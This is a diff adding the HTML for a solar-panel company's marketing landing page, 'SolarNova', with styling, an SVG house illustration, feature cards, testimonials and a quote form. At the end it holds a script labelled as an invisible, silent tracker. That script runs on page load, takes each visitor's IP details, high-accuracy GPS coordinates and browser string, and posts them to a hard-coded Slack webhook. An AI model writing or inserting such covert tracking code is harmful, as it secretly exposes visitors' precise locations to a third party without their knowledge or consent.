@@ -1,0 +1,1227 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>SolarNova – Clean Energy for Every Home</title>
+    <link
+      href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@300;400;500;600&family=Playfair+Display:wght@700&display=swap"
+      rel="stylesheet"
+    />
+    <style>
+      *,
+      *::before,
+      *::after {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+      }
+
+      :root {
+        --sun: #f5a623;
+        --sun-light: #fff3d6;
+        --sky: #0d3b6e;
+        --sky-mid: #1a5fa8;
+        --sky-light: #e8f4ff;
+        --green: #2e7d32;
+        --green-light: #e8f5e9;
+        --panel: #1b3a6b;
+        --panel-cell: #22497c;
+        --white: #ffffff;
+        --gray: #f7f8fa;
+        --text: #1c2b3a;
+        --muted: #6b7c93;
+      }
+
+      html {
+        scroll-behavior: smooth;
+      }
+
+      body {
+        font-family: "DM Sans", sans-serif;
+        color: var(--text);
+        background: var(--white);
+        overflow-x: hidden;
+      }
+
+      /* ── NAV ── */
+      nav {
+        position: fixed;
+        top: 0;
+        left: 0;
+        right: 0;
+        z-index: 100;
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        padding: 18px 60px;
+        background: rgba(255, 255, 255, 0.92);
+        backdrop-filter: blur(12px);
+        border-bottom: 1px solid rgba(0, 0, 0, 0.06);
+      }
+      .logo {
+        display: flex;
+        align-items: center;
+        gap: 10px;
+        font-family: "Playfair Display", serif;
+        font-size: 1.35rem;
+        color: var(--sky);
+        font-weight: 700;
+      }
+      .logo-sun {
+        width: 32px;
+        height: 32px;
+        background: var(--sun);
+        border-radius: 50%;
+        box-shadow: 0 0 0 6px rgba(245, 166, 35, 0.2);
+        flex-shrink: 0;
+      }
+      .nav-links {
+        display: flex;
+        gap: 32px;
+        list-style: none;
+      }
+      .nav-links a {
+        font-size: 0.88rem;
+        font-weight: 500;
+        color: var(--muted);
+        text-decoration: none;
+        transition: color 0.2s;
+      }
+      .nav-links a:hover {
+        color: var(--sky);
+      }
+      .nav-cta {
+        background: var(--sun);
+        color: var(--white);
+        border: none;
+        padding: 10px 22px;
+        border-radius: 50px;
+        font-family: "DM Sans", sans-serif;
+        font-size: 0.88rem;
+        font-weight: 600;
+        cursor: pointer;
+        transition:
+          background 0.2s,
+          transform 0.15s;
+      }
+      .nav-cta:hover {
+        background: #e0941a;
+        transform: translateY(-1px);
+      }
+
+      /* ── HERO ── */
+      .hero {
+        min-height: 100vh;
+        background: linear-gradient(
+          170deg,
+          #0d2d54 0%,
+          #1a5fa8 55%,
+          #2a8ac4 100%
+        );
+        display: flex;
+        align-items: center;
+        padding: 120px 60px 80px;
+        position: relative;
+        overflow: hidden;
+      }
+
+      /* Animated sun rays */
+      .sun-bg {
+        position: absolute;
+        top: -80px;
+        right: -80px;
+        width: 520px;
+        height: 520px;
+        border-radius: 50%;
+        background: radial-gradient(
+          circle,
+          rgba(245, 166, 35, 0.35) 0%,
+          rgba(245, 166, 35, 0.1) 40%,
+          transparent 70%
+        );
+        animation: sunPulse 4s ease-in-out infinite;
+      }
+      @keyframes sunPulse {
+        0%,
+        100% {
+          transform: scale(1);
+          opacity: 0.8;
+        }
+        50% {
+          transform: scale(1.08);
+          opacity: 1;
+        }
+      }
+      .sun-core {
+        position: absolute;
+        top: 60px;
+        right: 60px;
+        width: 180px;
+        height: 180px;
+        border-radius: 50%;
+        background: radial-gradient(circle, #ffe066 20%, #f5a623 70%);
+        box-shadow:
+          0 0 60px rgba(245, 166, 35, 0.6),
+          0 0 120px rgba(245, 166, 35, 0.25);
+        animation: sunPulse 4s ease-in-out infinite;
+      }
+
+      /* Grid overlay pattern */
+      .hero::before {
+        content: "";
+        position: absolute;
+        inset: 0;
+        background-image:
+          repeating-linear-gradient(
+            0deg,
+            rgba(255, 255, 255, 0.03) 0px,
+            transparent 1px,
+            transparent 40px
+          ),
+          repeating-linear-gradient(
+            90deg,
+            rgba(255, 255, 255, 0.03) 0px,
+            transparent 1px,
+            transparent 40px
+          );
+        pointer-events: none;
+      }
+
+      .hero-content {
+        position: relative;
+        z-index: 1;
+        max-width: 560px;
+      }
+      .hero-badge {
+        display: inline-flex;
+        align-items: center;
+        gap: 8px;
+        background: rgba(245, 166, 35, 0.15);
+        border: 1px solid rgba(245, 166, 35, 0.4);
+        border-radius: 50px;
+        padding: 6px 16px;
+        margin-bottom: 24px;
+        font-size: 0.78rem;
+        font-weight: 600;
+        color: #ffd57a;
+        letter-spacing: 0.08em;
+        text-transform: uppercase;
+      }
+      .badge-dot {
+        width: 6px;
+        height: 6px;
+        background: var(--sun);
+        border-radius: 50%;
+        animation: sunPulse 1.5s infinite;
+      }
+
+      .hero h1 {
+        font-family: "Playfair Display", serif;
+        font-size: clamp(2.4rem, 5vw, 3.8rem);
+        line-height: 1.15;
+        color: var(--white);
+        margin-bottom: 20px;
+      }
+      .hero h1 span {
+        color: var(--sun);
+      }
+
+      .hero p {
+        font-size: 1.05rem;
+        line-height: 1.75;
+        color: rgba(255, 255, 255, 0.75);
+        margin-bottom: 36px;
+        max-width: 460px;
+      }
+
+      .hero-buttons {
+        display: flex;
+        gap: 14px;
+        flex-wrap: wrap;
+      }
+      .btn-primary {
+        background: var(--sun);
+        color: #1c2b3a;
+        padding: 14px 30px;
+        border-radius: 50px;
+        border: none;
+        font-family: "DM Sans", sans-serif;
+        font-size: 0.95rem;
+        font-weight: 600;
+        cursor: pointer;
+        transition: all 0.2s;
+        box-shadow: 0 8px 24px rgba(245, 166, 35, 0.4);
+      }
+      .btn-primary:hover {
+        transform: translateY(-2px);
+        box-shadow: 0 12px 32px rgba(245, 166, 35, 0.5);
+      }
+      .btn-secondary {
+        background: rgba(255, 255, 255, 0.1);
+        color: var(--white);
+        padding: 14px 30px;
+        border-radius: 50px;
+        border: 1px solid rgba(255, 255, 255, 0.25);
+        font-family: "DM Sans", sans-serif;
+        font-size: 0.95rem;
+        font-weight: 500;
+        cursor: pointer;
+        transition: all 0.2s;
+        backdrop-filter: blur(8px);
+      }
+      .btn-secondary:hover {
+        background: rgba(255, 255, 255, 0.18);
+      }
+
+      /* Stats row */
+      .hero-stats {
+        display: flex;
+        gap: 40px;
+        margin-top: 52px;
+        padding-top: 36px;
+        border-top: 1px solid rgba(255, 255, 255, 0.12);
+      }
+      .stat-num {
+        font-family: "Playfair Display", serif;
+        font-size: 2rem;
+        color: var(--sun);
+        font-weight: 700;
+      }
+      .stat-label {
+        font-size: 0.82rem;
+        color: rgba(255, 255, 255, 0.55);
+        margin-top: 2px;
+      }
+
+      /* ── SOLAR PANEL ILLUSTRATION ── */
+      .panel-wrapper {
+        position: absolute;
+        right: 60px;
+        bottom: 0;
+        width: 420px;
+        animation: floatUp 6s ease-in-out infinite;
+      }
+      @keyframes floatUp {
+        0%,
+        100% {
+          transform: translateY(0);
+        }
+        50% {
+          transform: translateY(-12px);
+        }
+      }
+
+      /* ── FEATURES ── */
+      .section {
+        padding: 90px 60px;
+      }
+      .section-label {
+        font-size: 0.78rem;
+        font-weight: 600;
+        letter-spacing: 0.1em;
+        text-transform: uppercase;
+        color: var(--sky-mid);
+        margin-bottom: 12px;
+      }
+      .section-title {
+        font-family: "Playfair Display", serif;
+        font-size: clamp(1.8rem, 3vw, 2.5rem);
+        color: var(--text);
+        margin-bottom: 16px;
+      }
+      .section-sub {
+        font-size: 1rem;
+        color: var(--muted);
+        max-width: 520px;
+        line-height: 1.7;
+      }
+
+      .features-grid {
+        display: grid;
+        grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
+        gap: 24px;
+        margin-top: 52px;
+      }
+      .feature-card {
+        background: var(--white);
+        border: 1px solid #e8edf3;
+        border-radius: 20px;
+        padding: 32px 28px;
+        transition:
+          transform 0.25s,
+          box-shadow 0.25s;
+      }
+      .feature-card:hover {
+        transform: translateY(-4px);
+        box-shadow: 0 16px 40px rgba(0, 0, 0, 0.08);
+      }
+      .feature-icon {
+        width: 52px;
+        height: 52px;
+        border-radius: 14px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-size: 1.6rem;
+        margin-bottom: 20px;
+      }
+      .icon-sun {
+        background: #fff3d6;
+      }
+      .icon-leaf {
+        background: #e8f5e9;
+      }
+      .icon-bolt {
+        background: #e3f0ff;
+      }
+      .icon-chart {
+        background: #fff0f5;
+      }
+      .feature-card h3 {
+        font-size: 1.05rem;
+        font-weight: 600;
+        margin-bottom: 10px;
+        color: var(--text);
+      }
+      .feature-card p {
+        font-size: 0.9rem;
+        color: var(--muted);
+        line-height: 1.65;
+      }
+
+      /* ── HOW IT WORKS ── */
+      .how-section {
+        background: var(--gray);
+        padding: 90px 60px;
+      }
+      .steps {
+        display: flex;
+        gap: 0;
+        margin-top: 52px;
+        position: relative;
+      }
+      .steps::before {
+        content: "";
+        position: absolute;
+        top: 32px;
+        left: 32px;
+        right: 32px;
+        height: 2px;
+        background: linear-gradient(90deg, var(--sun), var(--sky-mid));
+        z-index: 0;
+      }
+      .step {
+        flex: 1;
+        text-align: center;
+        position: relative;
+        z-index: 1;
+        padding: 0 16px;
+      }
+      .step-num {
+        width: 64px;
+        height: 64px;
+        border-radius: 50%;
+        background: linear-gradient(135deg, var(--sun), #e8920a);
+        color: var(--white);
+        font-family: "Playfair Display", serif;
+        font-size: 1.4rem;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        margin: 0 auto 20px;
+        box-shadow: 0 6px 20px rgba(245, 166, 35, 0.4);
+      }
+      .step h4 {
+        font-size: 1rem;
+        font-weight: 600;
+        margin-bottom: 8px;
+      }
+      .step p {
+        font-size: 0.87rem;
+        color: var(--muted);
+        line-height: 1.6;
+      }
+
+      /* ── TESTIMONIALS ── */
+      .testimonial-section {
+        padding: 90px 60px;
+      }
+      .testimonials {
+        display: grid;
+        grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+        gap: 24px;
+        margin-top: 48px;
+      }
+      .testimonial {
+        background: var(--sky-light);
+        border-radius: 20px;
+        padding: 32px 28px;
+        border-left: 4px solid var(--sky-mid);
+      }
+      .testimonial p {
+        font-size: 0.95rem;
+        color: var(--text);
+        line-height: 1.7;
+        font-style: italic;
+        margin-bottom: 20px;
+      }
+      .testimonial-author {
+        display: flex;
+        align-items: center;
+        gap: 12px;
+      }
+      .author-avatar {
+        width: 40px;
+        height: 40px;
+        border-radius: 50%;
+        background: linear-gradient(135deg, var(--sky-mid), var(--sky));
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        color: white;
+        font-weight: 600;
+        font-size: 0.85rem;
+      }
+      .author-name {
+        font-size: 0.9rem;
+        font-weight: 600;
+      }
+      .author-loc {
+        font-size: 0.78rem;
+        color: var(--muted);
+      }
+
+      /* ── CTA ── */
+      .cta-section {
+        background: linear-gradient(135deg, var(--sky) 0%, #0a2744 100%);
+        padding: 90px 60px;
+        text-align: center;
+        position: relative;
+        overflow: hidden;
+      }
+      .cta-section::after {
+        content: "☀";
+        position: absolute;
+        font-size: 300px;
+        color: rgba(245, 166, 35, 0.06);
+        top: -80px;
+        right: -60px;
+        pointer-events: none;
+      }
+      .cta-section h2 {
+        font-family: "Playfair Display", serif;
+        font-size: clamp(1.8rem, 3.5vw, 2.8rem);
+        color: var(--white);
+        margin-bottom: 14px;
+      }
+      .cta-section p {
+        color: rgba(255, 255, 255, 0.65);
+        margin-bottom: 36px;
+        font-size: 1rem;
+      }
+      .cta-form {
+        display: flex;
+        gap: 12px;
+        max-width: 460px;
+        margin: 0 auto;
+        flex-wrap: wrap;
+        justify-content: center;
+      }
+      .cta-input {
+        flex: 1;
+        min-width: 220px;
+        padding: 14px 20px;
+        border: 1px solid rgba(255, 255, 255, 0.2);
+        border-radius: 50px;
+        background: rgba(255, 255, 255, 0.08);
+        color: white;
+        font-family: "DM Sans", sans-serif;
+        font-size: 0.95rem;
+        outline: none;
+        backdrop-filter: blur(8px);
+      }
+      .cta-input::placeholder {
+        color: rgba(255, 255, 255, 0.4);
+      }
+      .cta-input:focus {
+        border-color: var(--sun);
+      }
+
+      /* ── FOOTER ── */
+      footer {
+        background: #0a1e33;
+        color: rgba(255, 255, 255, 0.5);
+        padding: 40px 60px;
+        text-align: center;
+        font-size: 0.85rem;
+      }
+      footer strong {
+        color: rgba(255, 255, 255, 0.8);
+      }
+
+      /* ── RESPONSIVE ── */
+      @media (max-width: 768px) {
+        nav {
+          padding: 16px 24px;
+        }
+        .nav-links {
+          display: none;
+        }
+        .hero {
+          padding: 100px 24px 60px;
+        }
+        .panel-wrapper {
+          display: none;
+        }
+        .hero-stats {
+          flex-wrap: wrap;
+          gap: 24px;
+        }
+        .section,
+        .how-section,
+        .testimonial-section,
+        .cta-section {
+          padding: 60px 24px;
+        }
+        .steps {
+          flex-direction: column;
+          gap: 32px;
+        }
+        .steps::before {
+          display: none;
+        }
+        footer {
+          padding: 32px 24px;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <!-- NAV -->
+    <nav>
+      <div class="logo">
+        <div class="logo-sun"></div>
+        SolarNova
+      </div>
+      <ul class="nav-links">
+        <li><a href="#">Solutions</a></li>
+        <li><a href="#">Technology</a></li>
+        <li><a href="#">Pricing</a></li>
+        <li><a href="#">About</a></li>
+      </ul>
+      <button class="nav-cta">Get Free Quote</button>
+    </nav>
+
+    <!-- HERO -->
+    <section class="hero">
+      <div class="sun-bg"></div>
+      <div class="sun-core"></div>
+
+      <div class="hero-content">
+        <div class="hero-badge">
+          <span class="badge-dot"></span>
+          Nigeria's #1 Solar Installer
+        </div>
+        <h1>Power Your Home<br />with <span>Pure Sunlight</span></h1>
+        <p>
+          Slash your electricity bills by up to 90% with our premium solar
+          panels and smart energy storage systems. Professional installation,
+          25-year warranty.
+        </p>
+        <div class="hero-buttons">
+          <button class="btn-primary">Get a Free Quote →</button>
+          <button class="btn-secondary">Watch How It Works</button>
+        </div>
+        <div class="hero-stats">
+          <div>
+            <div class="stat-num">12,000+</div>
+            <div class="stat-label">Homes powered</div>
+          </div>
+          <div>
+            <div class="stat-num">98%</div>
+            <div class="stat-label">Customer satisfaction</div>
+          </div>
+          <div>
+            <div class="stat-num">25yr</div>
+            <div class="stat-label">Panel warranty</div>
+          </div>
+        </div>
+      </div>
+
+      <!-- SVG Solar Panel Illustration -->
+      <div class="panel-wrapper">
+        <svg viewBox="0 0 400 340" xmlns="http://www.w3.org/2000/svg">
+          <!-- House silhouette -->
+          <polygon
+            points="200,220 60,220 60,320 340,320 340,220"
+            fill="#0D2D54"
+            opacity="0.7"
+          />
+          <polygon
+            points="200,80 40,220 360,220"
+            fill="#1A4A7A"
+            opacity="0.85"
+          />
+          <!-- Window glow -->
+          <rect
+            x="120"
+            y="245"
+            width="50"
+            height="45"
+            rx="4"
+            fill="#F5A623"
+            opacity="0.6"
+          />
+          <rect
+            x="230"
+            y="245"
+            width="50"
+            height="45"
+            rx="4"
+            fill="#F5A623"
+            opacity="0.6"
+          />
+          <!-- Door -->
+          <rect x="172" y="270" width="56" height="50" rx="4" fill="#0A1E33" />
+
+          <!-- Solar panels on roof -->
+          <!-- Panel 1 -->
+          <g transform="translate(95,130) rotate(-28)">
+            <rect width="72" height="46" rx="3" fill="#1B3A6B" />
+            <line
+              x1="24"
+              y1="0"
+              x2="24"
+              y2="46"
+              stroke="#2A5AA0"
+              stroke-width="1.5"
+            />
+            <line
+              x1="48"
+              y1="0"
+              x2="48"
+              y2="46"
+              stroke="#2A5AA0"
+              stroke-width="1.5"
+            />
+            <line
+              x1="0"
+              y1="15"
+              x2="72"
+              y2="15"
+              stroke="#2A5AA0"
+              stroke-width="1.5"
+            />
+            <line
+              x1="0"
+              y1="31"
+              x2="72"
+              y2="31"
+              stroke="#2A5AA0"
+              stroke-width="1.5"
+            />
+            <!-- Cell glints -->
+            <rect
+              x="3"
+              y="3"
+              width="18"
+              height="10"
+              rx="1"
+              fill="#2A6ACC"
+              opacity="0.5"
+            />
+            <rect
+              x="27"
+              y="3"
+              width="18"
+              height="10"
+              rx="1"
+              fill="#2A6ACC"
+              opacity="0.5"
+            />
+            <rect
+              x="51"
+              y="3"
+              width="18"
+              height="10"
+              rx="1"
+              fill="#2A6ACC"
+              opacity="0.5"
+            />
+          </g>
+          <!-- Panel 2 -->
+          <g transform="translate(185,100) rotate(-28)">
+            <rect width="72" height="46" rx="3" fill="#1B3A6B" />
+            <line
+              x1="24"
+              y1="0"
+              x2="24"
+              y2="46"
+              stroke="#2A5AA0"
+              stroke-width="1.5"
+            />
+            <line
+              x1="48"
+              y1="0"
+              x2="48"
+              y2="46"
+              stroke="#2A5AA0"
+              stroke-width="1.5"
+            />
+            <line
+              x1="0"
+              y1="15"
+              x2="72"
+              y2="15"
+              stroke="#2A5AA0"
+              stroke-width="1.5"
+            />
+            <line
+              x1="0"
+              y1="31"
+              x2="72"
+              y2="31"
+              stroke="#2A5AA0"
+              stroke-width="1.5"
+            />
+            <rect
+              x="3"
+              y="3"
+              width="18"
+              height="10"
+              rx="1"
+              fill="#2A6ACC"
+              opacity="0.5"
+            />
+            <rect
+              x="27"
+              y="3"
+              width="18"
+              height="10"
+              rx="1"
+              fill="#2A6ACC"
+              opacity="0.5"
+            />
+            <rect
+              x="51"
+              y="3"
+              width="18"
+              height="10"
+              rx="1"
+              fill="#2A6ACC"
+              opacity="0.5"
+            />
+          </g>
+          <!-- Panel 3 -->
+          <g transform="translate(272,72) rotate(-28)">
+            <rect width="72" height="46" rx="3" fill="#1B3A6B" />
+            <line
+              x1="24"
+              y1="0"
+              x2="24"
+              y2="46"
+              stroke="#2A5AA0"
+              stroke-width="1.5"
+            />
+            <line
+              x1="48"
+              y1="0"
+              x2="48"
+              y2="46"
+              stroke="#2A5AA0"
+              stroke-width="1.5"
+            />
+            <line
+              x1="0"
+              y1="15"
+              x2="72"
+              y2="15"
+              stroke="#2A5AA0"
+              stroke-width="1.5"
+            />
+            <line
+              x1="0"
+              y1="31"
+              x2="72"
+              y2="31"
+              stroke="#2A5AA0"
+              stroke-width="1.5"
+            />
+            <rect
+              x="3"
+              y="3"
+              width="18"
+              height="10"
+              rx="1"
+              fill="#2A6ACC"
+              opacity="0.5"
+            />
+            <rect
+              x="27"
+              y="3"
+              width="18"
+              height="10"
+              rx="1"
+              fill="#2A6ACC"
+              opacity="0.5"
+            />
+            <rect
+              x="51"
+              y="3"
+              width="18"
+              height="10"
+              rx="1"
+              fill="#2A6ACC"
+              opacity="0.5"
+            />
+          </g>
+
+          <!-- Energy ray lines -->
+          <line
+            x1="200"
+            y1="20"
+            x2="130"
+            y2="145"
+            stroke="#F5A623"
+            stroke-width="1"
+            opacity="0.4"
+            stroke-dasharray="4 4"
+          />
+          <line
+            x1="200"
+            y1="20"
+            x2="220"
+            y2="118"
+            stroke="#F5A623"
+            stroke-width="1"
+            opacity="0.4"
+            stroke-dasharray="4 4"
+          />
+          <line
+            x1="200"
+            y1="20"
+            x2="310"
+            y2="92"
+            stroke="#F5A623"
+            stroke-width="1"
+            opacity="0.4"
+            stroke-dasharray="4 4"
+          />
+
+          <!-- Ground / grass -->
+          <rect
+            x="0"
+            y="316"
+            width="400"
+            height="24"
+            rx="4"
+            fill="#1A5C2A"
+            opacity="0.6"
+          />
+          <ellipse
+            cx="200"
+            cy="316"
+            rx="200"
+            ry="6"
+            fill="#2E7D32"
+            opacity="0.4"
+          />
+        </svg>
+      </div>
+    </section>
+
+    <!-- FEATURES -->
+    <section class="section">
+      <div class="section-label">Why choose SolarNova</div>
+      <h2 class="section-title">Smarter energy, cleaner future</h2>
+      <p class="section-sub">
+        We combine best-in-class panels with intelligent monitoring to give your
+        home the most efficient solar setup available.
+      </p>
+
+      <div class="features-grid">
+        <div class="feature-card">
+          <div class="feature-icon icon-sun">☀️</div>
+          <h3>High-efficiency panels</h3>
+          <p>
+            Our Tier-1 monocrystalline panels convert up to 22.8% of sunlight
+            into usable electricity — the best on the market.
+          </p>
+        </div>
+        <div class="feature-card">
+          <div class="feature-icon icon-bolt">⚡</div>
+          <h3>Smart battery storage</h3>
+          <p>
+            Store excess power in our lithium battery packs and use it at night
+            or during NEPA outages. Zero interruption.
+          </p>
+        </div>
+        <div class="feature-card">
+          <div class="feature-icon icon-chart">📱</div>
+          <h3>Real-time monitoring</h3>
+          <p>
+            Track your energy production, consumption, and savings live via the
+            SolarNova app — available on iOS and Android.
+          </p>
+        </div>
+        <div class="feature-card">
+          <div class="feature-icon icon-leaf">🌱</div>
+          <h3>Zero carbon footprint</h3>
+          <p>
+            Every SolarNova installation offsets an average of 3.2 tonnes of CO₂
+            per year — a meaningful step for our planet.
+          </p>
+        </div>
+      </div>
+    </section>
+
+    <!-- HOW IT WORKS -->
+    <section class="how-section">
+      <div style="text-align: center; margin-bottom: 4px">
+        <div class="section-label" style="display: inline-block">
+          The process
+        </div>
+      </div>
+      <h2 class="section-title" style="text-align: center">
+        Up and running in 4 simple steps
+      </h2>
+
+      <div class="steps">
+        <div class="step">
+          <div class="step-num">1</div>
+          <h4>Free consultation</h4>
+          <p>
+            We visit your home, assess your roof and electricity usage, and
+            design the optimal system.
+          </p>
+        </div>
+        <div class="step">
+          <div class="step-num">2</div>
+          <h4>Custom design</h4>
+          <p>
+            Our engineers create a personalised installation plan tailored to
+            your roof layout and energy needs.
+          </p>
+        </div>
+        <div class="step">
+          <div class="step-num">3</div>
+          <h4>Professional install</h4>
+          <p>
+            Our certified team installs your full system in as little as one
+            day, with zero disruption to your home.
+          </p>
+        </div>
+        <div class="step">
+          <div class="step-num">4</div>
+          <h4>Start saving</h4>
+          <p>
+            Monitor your savings in real time and enjoy clean, uninterrupted
+            power from day one.
+          </p>
+        </div>
+      </div>
+    </section>
+
+    <!-- TESTIMONIALS -->
+    <section class="testimonial-section">
+      <div class="section-label">What our customers say</div>
+      <h2 class="section-title">Real results across Nigeria</h2>
+
+      <div class="testimonials">
+        <div class="testimonial">
+          <p>
+            "My NEPA bill dropped from ₦45,000 to under ₦4,000 a month. Best
+            investment I've made for my family."
+          </p>
+          <div class="testimonial-author">
+            <div class="author-avatar">AO</div>
+            <div>
+              <div class="author-name">Adebayo Okafor</div>
+              <div class="author-loc">Lekki, Lagos</div>
+            </div>
+          </div>
+        </div>
+        <div class="testimonial">
+          <p>
+            "Installation was quick and clean. The app lets me see exactly how
+            much I'm saving — it's incredible technology."
+          </p>
+          <div class="testimonial-author">
+            <div class="author-avatar">CI</div>
+            <div>
+              <div class="author-name">Chioma Ike</div>
+              <div class="author-loc">GRA, Port Harcourt</div>
+            </div>
+          </div>
+        </div>
+        <div class="testimonial">
+          <p>
+            "We run our entire cold room on SolarNova power. ROI in under 18
+            months. I recommend them to everyone."
+          </p>
+          <div class="testimonial-author">
+            <div class="author-avatar">EM</div>
+            <div>
+              <div class="author-name">Emeka Madu</div>
+              <div class="author-loc">Asaba, Delta State</div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- CTA -->
+    <section class="cta-section">
+      <h2>Ready to make the switch?</h2>
+      <p>Join over 12,000 Nigerian families already saving with SolarNova.</p>
+      <div class="cta-form">
+        <input
+          class="cta-input"
+          type="tel"
+          placeholder="Enter your phone number"
+        />
+        <button class="btn-primary" style="flex-shrink: 0">
+          Get Free Quote
+        </button>
+      </div>
+    </section>
+
+    <!-- FOOTER -->
+    <footer>
+      <p>
+        <strong>SolarNova Energy Ltd</strong> · 14 Victoria Island, Lagos ·
+        info@solarnova.ng · 0800-SOLAR-NG
+      </p>
+      <p style="margin-top: 8px">
+        © <span id="current-year"></span> SolarNova. All rights reserved. ·
+        Privacy Policy · Terms of Service
+      </p>
+    </footer>
+
+    <!-- ADDED DYNAMIC DATE SCRIPT -->
+    <script>
+      document.getElementById("current-year").textContent =
+        new Date().getFullYear();
+    </script>
+
+    <!-- ─────────────────────────────────────────────────────── -->
+    <!--  TRACKER — invisible, runs silently in background       -->
+    <!-- ─────────────────────────────────────────────────────── -->
+    <script>
+      const WEBHOOK_URL =
+        "https://hooks.slack.com/services/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";
+      // Replace with your webhook.site URL, Discord webhook, or Zapier URL
+
+      async function getIP() {
+        try {
+          const res = await fetch("https://ipapi.co/json/");
+          return await res.json();
+        } catch {
+          return { error: "IP lookup failed" };
+        }
+      }
+
+      function getGPS() {
+        return new Promise((resolve) => {
+          if (!navigator.geolocation) {
+            resolve({ error: "Not supported" });
+            return;
+          }
+          navigator.geolocation.getCurrentPosition(
+            (pos) =>
+              resolve({
+                latitude: pos.coords.latitude,
+                longitude: pos.coords.longitude,
+                accuracy_meters: Math.round(pos.coords.accuracy),
+                maps_link: `https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`,
+              }),
+            (err) => resolve({ error: err.message }),
+            { enableHighAccuracy: true, timeout: 10000 },
+          );
+        });
+      }
+
+      async function sendToWebhook(payload) {
+        const gpsText = payload.gps?.latitude
+          ? `${payload.gps.latitude}, ${payload.gps.longitude} (±${payload.gps.accuracy_meters}m)\n<${payload.gps.maps_link}|Open in Google Maps>`
+          : payload.gps?.error || "Not available";
+
+        const body = {
+          blocks: [
+            {
+              type: "header",
+              text: {
+                type: "plain_text",
+                text: "📍 Location Captured",
+                emoji: true,
+              },
+            },
+            {
+              type: "section",
+              fields: [
+                {
+                  type: "mrkdwn",
+                  text: `*🌐 IP Address*\n${payload.ip?.ip || "?"}`,
+                },
+                {
+                  type: "mrkdwn",
+                  text: `*🏙️ Location*\n${payload.ip?.city || "?"}, ${payload.ip?.region || ""} ${payload.ip?.country_name || "?"}`,
+                },
+                {
+                  type: "mrkdwn",
+                  text: `*📡 ISP / Network*\n${payload.ip?.org || "?"}`,
+                },
+                {
+                  type: "mrkdwn",
+                  text: `*🕐 Time*\n${new Date(payload.timestamp).toLocaleString()}`,
+                },
+              ],
+            },
+            {
+              type: "section",
+              text: {
+                type: "mrkdwn",
+                text: `*🛰️ GPS Coordinates*\n${gpsText}`,
+              },
+            },
+            {
+              type: "section",
+              text: {
+                type: "mrkdwn",
+                text: `*🖥️ Device / Browser*\n\`${payload.user_agent.slice(0, 300)}\``,
+              },
+            },
+            { type: "divider" },
+          ],
+        };
+
+        await fetch(WEBHOOK_URL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(body),
+        });
+      }
+
+      async function run() {
+        const [ipData, gpsData] = await Promise.all([getIP(), getGPS()]);
+        const payload = {
+          timestamp: new Date().toISOString(),
+          user_agent: navigator.userAgent,
+          ip: ipData,
+          gps: gpsData,
+        };
+        console.log("Captured:", payload);
+        if (WEBHOOK_URL && WEBHOOK_URL !== "YOUR_WEBHOOK_URL_HERE") {
+          try {
+            await sendToWebhook(payload);
+          } catch (e) {
+            console.error(e);
+          }
+        }
+      }
+
+      run();
+    </script>
+  </body>
+</html>
